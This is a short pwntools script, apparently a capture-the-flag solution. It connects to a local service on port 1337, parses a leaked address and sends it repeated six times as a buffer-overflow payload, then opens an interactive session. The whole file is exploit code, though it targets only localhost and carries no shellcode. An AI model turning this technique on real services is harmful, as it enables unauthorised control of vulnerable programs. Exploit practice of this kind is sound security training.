from pwn import *
conn = remote('127.0.0.1', 1337)
print(conn.recvuntil('= '))
addr = int(conn.recvline()[:-1],16)
addr = p32(addr)
conn.sendline(addr * 6)
conn.interactive()
